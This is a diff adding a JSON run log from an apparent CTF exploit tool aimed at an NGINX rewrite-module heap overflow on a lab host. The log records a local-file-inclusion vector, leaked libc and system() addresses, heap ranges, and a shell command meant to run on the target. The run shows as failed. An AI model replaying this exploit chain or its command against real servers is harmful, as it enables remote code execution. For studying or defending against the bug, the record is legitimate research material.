@@ -1,0 +1,233 @@
+{
+  "argv": [
+    "/Users/hamid/Downloads/temp/nginx-rift/Nginx-Rift/demo_ctf_exploit_v1_9.py",
+    "--host",
+    "192.168.1.205:19321",
+    "--cmd",
+    "ls -la",
+    "--artifact-dir",
+    "artifacts",
+    "--target-profile",
+    "generic",
+    "--scheme",
+    "http",
+    "--lfi-endpoint",
+    "/lfi.php",
+    "--file-param",
+    "file",
+    "--offset-param",
+    "offset",
+    "--length-param",
+    "length",
+    "--phpinfo-path",
+    "/phpinfo.php",
+    "--rounds",
+    "2"
+  ],
+  "artifact_path": "artifacts/demo_v1_9_20260515-074106.json",
+  "binary_fingerprints": {
+    "libc": {
+      "build_id": "095c7ba148aeca81668091f718047078d57efddb",
+      "bytes_read": 2220400,
+      "path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "sha256": "c53819710b163d3f1d2541778590d58d3ef31cb0ed75adcbe059faac68c1e72d"
+    },
+    "nginx": {
+      "build_id": "060e053ab1fa1a2876b7fe0ff4eff0cc777857b6",
+      "bytes_read": 5583848,
+      "path": "/nginx-src/build/nginx",
+      "sha256": "14bebe8937678598b8ebb8449f8c155478a4c49894c9467ce51d54a79352f08f"
+    }
+  },
+  "bug": {
+    "cve": "CVE-2026-42945",
+    "detail": "rewrite/set args-escaping length/copy mismatch",
+    "fixed_upstream": "NGINX OSS 1.30.1 / 1.31.0; NGINX Plus R36 P4 / R35 P2 / R32 P6",
+    "name": "NGINX rewrite-module heap buffer overflow"
+  },
+  "calibration_attempts": [],
+  "completed_at": "2026-05-15T05:41:09+00:00",
+  "error": "HTTP Error 404: Not Found",
+  "git": {
+    "branch": "ctf-remote-aslr-lfi",
+    "commit": "538fd56",
+    "dirty": true
+  },
+  "initial_target_facts": {
+    "heap_ranges": [
+      [
+        "0x55e420ff3000",
+        "0x55e421058000"
+      ],
+      [
+        "0x55e421058000",
+        "0x55e421099000"
+      ]
+    ],
+    "legacy_safe_candidates": 2,
+    "libc_base": "0x7fca47a6d000",
+    "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+    "nginx_path": "/nginx-src/build/nginx",
+    "nginx_rw_base": "0x55e420b83000",
+    "system_addr": "0x7fca47abdd70",
+    "system_offset": "0x50d70",
+    "worker_pid": 3471,
+    "worker_uid": 65534
+  },
+  "pre_existing_marker": {
+    "contains_current_token": false,
+    "exists": false,
+    "path": "/tmp/nginx_rift_demo_v1_9_e215dd84cea4",
+    "size": 0
+  },
+  "preflight": {
+    "boot_id": "3c4fc88e-428c-4d1a-8be7-eb1faf2cd0d7",
+    "config_checks": {},
+    "config_sha256": "",
+    "core_pattern": "core",
+    "http1_alive": true,
+    "http2_probe_bytes": 49,
+    "master_pid": 3044,
+    "os_release": "Ubuntu 22.04.3 LTS",
+    "proc_version": "Linux version 5.15.0-84-generic (buildd@lcy02-amd64-005) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023",
+    "randomize_va_space": "2",
+    "strict_failures": [],
+    "strict_preflight": true,
+    "suid_dumpable": "2",
+    "target_profile": "generic",
+    "worker_children": [
+      3471
+    ],
+    "worker_mode": "single"
+  },
+  "proof": {
+    "cleanup_core": true,
+    "cleanup_delay": 30.0,
+    "cmd": "umask 077; sh -c 'ls -la' > /tmp/nginx_rift_demo_v1_9_e215dd84cea4 2>&1; rc=$?; printf '\\n__NGINX_RIFT_TOKEN__=%s\\n__NGINX_RIFT_RC__=%s\\n' de2e0e8cd50e609f0c5331b8f060e455 \"$rc\" >> /tmp/nginx_rift_demo_v1_9_e215dd84cea4; (sleep 30; rm -f /tmp/nginx_rift_demo_v1_9_e215dd84cea4 /app/tmp/core) >/dev/null 2>&1 &",
+    "exec_cmd": "ls -la",
+    "marker_path": "/tmp/nginx_rift_demo_v1_9_e215dd84cea4",
+    "mode": "exec",
+    "token": "de2e0e8cd50e609f0c5331b8f060e455"
+  },
+  "rounds": [
+    {
+      "calibration_attempts": [],
+      "round": 1,
+      "started_at": "2026-05-15T05:41:06+00:00"
+    }
+  ],
+  "started_at": "2026-05-15T05:41:02+00:00",
+  "status": "failed",
+  "target": {
+    "file_read_vector": {
+      "endpoint": "/lfi.php",
+      "file_param": "file",
+      "length_param": "length",
+      "offset_param": "offset",
+      "phpinfo_path": "/phpinfo.php",
+      "type": "query-params"
+    },
+    "host": "192.168.1.205",
+    "phpinfo_route": "/phpinfo.php",
+    "port": 19321,
+    "profile": "generic",
+    "victim_protocol": "HTTP/2 on the same listener",
+    "vulnerable_route": "/api/..."
+  },
+  "target_snapshots": [
+    {
+      "heap_ranges": [
+        [
+          "0x55e420ff3000",
+          "0x55e421058000"
+        ],
+        [
+          "0x55e421058000",
+          "0x55e421099000"
+        ]
+      ],
+      "label": "initial",
+      "libc_base": "0x7fca47a6d000",
+      "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "nginx_path": "/nginx-src/build/nginx",
+      "nginx_rw_base": "0x55e420b83000",
+      "system_addr": "0x7fca47abdd70",
+      "system_offset": "0x50d70",
+      "worker_pid": 3471,
+      "worker_uid": 65534
+    },
+    {
+      "heap_ranges": [
+        [
+          "0x55e420ff3000",
+          "0x55e421058000"
+        ],
+        [
+          "0x55e421058000",
+          "0x55e421099000"
+        ]
+      ],
+      "label": "round_1_pre_probe_1",
+      "libc_base": "0x7fca47a6d000",
+      "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "nginx_path": "/nginx-src/build/nginx",
+      "nginx_rw_base": "0x55e420b83000",
+      "system_addr": "0x7fca47abdd70",
+      "system_offset": "0x50d70",
+      "worker_pid": 3471,
+      "worker_uid": 65534
+    }
+  ],
+  "tool": "demo_ctf_exploit_v1_9.py",
+  "tool_version": "v1.9",
+  "version_info": {
+    "http": {
+      "headers": {
+        "Connection": "close",
+        "Content-Length": "3",
+        "Content-Type": "text/plain",
+        "Date": "Fri, 15 May 2026 05:41:01 GMT",
+        "Server": "nginx/1.31.0"
+      },
+      "server": "nginx/1.31.0"
+    },
+    "libc": {
+      "build_id": "095c7ba148aeca81668091f718047078d57efddb",
+      "bytes_read": 2220400,
+      "dpkg_version": "2.35-0ubuntu3.13",
+      "glibc_symbol_max": "GLIBC_2.35",
+      "glibc_symbol_min": "GLIBC_2.2.5",
+      "path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "release_string": "GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.13) stable release version 2.35.",
+      "sha256": "c53819710b163d3f1d2541778590d58d3ef31cb0ed75adcbe059faac68c1e72d"
+    },
+    "nginx": {
+      "build_id": "060e053ab1fa1a2876b7fe0ff4eff0cc777857b6",
+      "bytes_read": 5583848,
+      "path": "/nginx-src/build/nginx",
+      "server_header": "nginx/1.31.0",
+      "sha256": "14bebe8937678598b8ebb8449f8c155478a4c49894c9467ce51d54a79352f08f",
+      "versions_from_binary": [
+        "nginx/1.31.0"
+      ]
+    },
+    "os": {
+      "codename": "jammy",
+      "id": "ubuntu",
+      "id_like": "debian",
+      "kernel_build": "Linux version 5.15.0-84-generic (buildd@lcy02-amd64-005) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023",
+      "kernel_release": "5.15.0-84-generic",
+      "name": "Ubuntu",
+      "ostype": "Linux",
+      "pretty_name": "Ubuntu 22.04.3 LTS",
+      "version": "22.04.3 LTS (Jammy Jellyfish)",
+      "version_id": "22.04"
+    },
+    "php": {
+      "php_version": "8.1.2-1ubuntu2.23",
+      "reachable": true,
+      "server_api": "FPM/FastCGI",
+      "server_software": ""
+    }
+  }
+}
